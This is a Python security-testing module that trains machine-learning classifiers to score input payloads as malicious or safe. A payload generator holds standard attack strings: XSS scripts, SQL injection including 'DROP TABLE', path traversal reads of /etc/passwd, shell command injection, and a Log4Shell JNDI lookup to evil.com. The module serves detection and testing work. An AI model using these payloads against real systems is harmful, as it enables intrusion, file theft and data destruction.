
import pandas as pd
import numpy as np
from sklearn.ensemble import RandomForestClassifier, IsolationForest
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.model_selection import train_test_split
from sklearn.metrics import accuracy_score, precision_score, recall_score, f1_score
import logging
import random

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Global model storage
trained_models = {}
vectorizers = {}

def train_classifier(dataset):
    """Train a machine learning classifier on the provided dataset"""
    try:
        logger.info(f"Training classifier on {len(dataset)} samples")
        
        # Prepare features and labels
        if isinstance(dataset, pd.DataFrame):
            X_text = dataset['payload'].astype(str)
            y = dataset['label'].map({'malicious': 1, 'safe': 0})
        else:
            # Handle list of dictionaries
            X_text = pd.Series([item['payload'] for item in dataset])
            y = pd.Series([1 if item['label'] == 'malicious' else 0 for item in dataset])
        
        # Vectorize text features
        vectorizer = TfidfVectorizer(max_features=1000, ngram_range=(1, 3))
        X_vectorized = vectorizer.fit_transform(X_text)
        
        # Split data
        X_train, X_test, y_train, y_test = train_test_split(
            X_vectorized, y, test_size=0.2, random_state=42
        )
        
        # Train model
        model = RandomForestClassifier(n_estimators=100, random_state=42)
        model.fit(X_train, y_train)
        
        # Evaluate
        y_pred = model.predict(X_test)
        accuracy = accuracy_score(y_test, y_pred)
        precision = precision_score(y_test, y_pred, zero_division=0)
        recall = recall_score(y_test, y_pred, zero_division=0)
        f1 = f1_score(y_test, y_pred, zero_division=0)
        
        # Store models globally
        trained_models['classifier'] = model
        vectorizers['classifier'] = vectorizer
        
        result = {
            'success': True,
            'accuracy': accuracy,
            'precision': precision,
            'recall': recall,
            'f1_score': f1,
            'model_type': 'RandomForest',
            'samples_trained': len(dataset),
            'features': X_vectorized.shape[1]
        }
        
        logger.info(f"Classifier training completed with {accuracy:.3f} accuracy")
        return result
        
    except Exception as e:
        logger.error(f"Error training classifier: {e}")
        return {
            'success': False,
            'error': str(e),
            'accuracy': 0.0
        }

def train_isolation_forest(dataset):
    """Train an isolation forest for anomaly detection"""
    try:
        logger.info("Training Isolation Forest for anomaly detection")
        
        # Prepare features
        if isinstance(dataset, pd.DataFrame):
            X_text = dataset['payload'].astype(str)
        else:
            X_text = pd.Series([item['payload'] for item in dataset])
        
        # Use existing vectorizer or create new one
        if 'classifier' in vectorizers:
            vectorizer = vectorizers['classifier']
            X_vectorized = vectorizer.transform(X_text)
        else:
            vectorizer = TfidfVectorizer(max_features=500, ngram_range=(1, 2))
            X_vectorized = vectorizer.fit_transform(X_text)
            vectorizers['isolation'] = vectorizer
        
        # Train Isolation Forest
        iso_forest = IsolationForest(contamination=0.1, random_state=42)
        iso_forest.fit(X_vectorized)
        
        # Calculate anomaly scores
        anomaly_scores = iso_forest.decision_function(X_vectorized)
        anomalies = iso_forest.predict(X_vectorized)
        anomaly_rate = (anomalies == -1).sum() / len(anomalies)
        
        # Store model
        trained_models['isolation_forest'] = iso_forest
        
        result = {
            'success': True,
            'model_type': 'IsolationForest',
            'samples_processed': len(dataset),
            'metrics': {
                'anomalyRate': anomaly_rate,
                'avgAnomalyScore': np.mean(anomaly_scores),
                'minAnomalyScore': np.min(anomaly_scores),
                'maxAnomalyScore': np.max(anomaly_scores)
            }
        }
        
        logger.info(f"Isolation Forest training completed with {anomaly_rate:.3f} anomaly rate")
        return result
        
    except Exception as e:
        logger.error(f"Error training isolation forest: {e}")
        return {
            'success': False,
            'error': str(e),
            'metrics': {'anomalyRate': 0.0}
        }

def generate_payloads(context=None, num_samples=5):
    """Generate security test payloads based on context"""
    try:
        logger.info(f"Generating {num_samples} payloads for context: {context}")
        
        # Payload templates by context
        payload_templates = {
            'xss': [
                "<script>alert('{}')</script>",
                "<img src=x onerror=alert('{}')>",
                "javascript:alert('{}')",
                "<svg onload=alert('{}')>",
                "';alert('{}');//"
            ],
            'sql injection': [
                "' OR 1=1 --",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL,NULL,NULL --",
                "admin'--",
                "' OR 'a'='a"
            ],
            'sqli': [
                "' OR 1=1 --",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL,NULL,NULL --",
                "admin'--",
                "' OR 'a'='a"
            ],
            'lfi': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "/proc/self/environ"
            ],
            'path traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "/etc/passwd%00",
                "....\\....\\....\\boot.ini"
            ],
            'command injection': [
                "; ls -la",
                "| whoami",
                "&& cat /etc/passwd",
                "`id`",
                "$(whoami)"
            ],
            'rce': [
                "; ls -la",
                "| whoami", 
                "&& cat /etc/passwd",
                "`id`",
                "$(whoami)"
            ]
        }
        
        # Default general payloads
        general_payloads = [
            "<script>alert('XSS')</script>",
            "' OR 1=1 --",
            "../../../etc/passwd",
            "; ls -la",
            "<img src=x onerror=alert(1)>",
            "'; DROP TABLE users; --",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "%(#context['xwork.MethodAccessor.denyMethodExecution']=false)",
            "/admin/../admin"
        ]
        
        # Select appropriate payloads
        if context and context.lower() in payload_templates:
            template_payloads = payload_templates[context.lower()]
            payloads = []
            
            for i in range(num_samples):
                if context.lower() == 'xss':
                    # For XSS, fill in the template
                    template = random.choice(template_payloads)
                    if '{}' in template:
                        payload = template.format(f'test{i+1}')
                    else:
                        payload = template
                else:
                    # For other contexts, use templates directly
                    payload = random.choice(template_payloads)
                
                payloads.append(payload)
        else:
            # Use general payloads
            payloads = random.sample(general_payloads, min(num_samples, len(general_payloads)))
            
            # If we need more payloads, add variations
            while len(payloads) < num_samples:
                base_payload = random.choice(general_payloads)
                variation = f"{base_payload}_{len(payloads)}"
                payloads.append(variation)
        
        logger.info(f"Generated {len(payloads)} payloads")
        return payloads
        
    except Exception as e:
        logger.error(f"Error generating payloads: {e}")
        return [
            "<script>alert('XSS')</script>",
            "' OR 1=1 --",
            "../../../etc/passwd"
        ]

def parse_uploaded_dataset(file_content):
    """Parse uploaded dataset file"""
    try:
        # Simple CSV parsing
        lines = file_content.strip().split('\n')
        dataset = []
        
        for line in lines[1:]:  # Skip header
            parts = line.split(',')
            if len(parts) >= 2:
                dataset.append({
                    'payload': parts[0].strip(),
                    'label': parts[1].strip(),
                    'response_code': int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 200
                })
        
        return dataset
        
    except Exception as e:
        logger.error(f"Error parsing dataset: {e}")
        return []

# Model prediction functions
def predict_payload_risk(payload):
    """Predict if a payload is risky using trained models"""
    try:
        if 'classifier' not in trained_models or 'classifier' not in vectorizers:
            return {'risk': 'unknown', 'confidence': 0.0}
        
        model = trained_models['classifier']
        vectorizer = vectorizers['classifier']
        
        # Vectorize payload
        payload_vector = vectorizer.transform([payload])
        
        # Predict
        prediction = model.predict(payload_vector)[0]
        probability = model.predict_proba(payload_vector)[0]
        
        return {
            'risk': 'high' if prediction == 1 else 'low',
            'confidence': max(probability),
            'malicious_probability': probability[1] if len(probability) > 1 else 0.0
        }
        
    except Exception as e:
        logger.error(f"Error predicting payload risk: {e}")
        return {'risk': 'unknown', 'confidence': 0.0}

if __name__ == "__main__":
    # Test the functions
    sample_data = [
        {'payload': "' OR 1=1 --", 'label': 'malicious'},
        {'payload': "normal search", 'label': 'safe'},
        {'payload': "<script>alert('xss')</script>", 'label': 'malicious'}
    ]
    
    print("Testing ML models...")
    classifier_result = train_classifier(sample_data)
    print(f"Classifier result: {classifier_result}")
    
    isolation_result = train_isolation_forest(sample_data)
    print(f"Isolation Forest result: {isolation_result}")
    
    payloads = generate_payloads("xss", 3)
    print(f"Generated payloads: {payloads}")
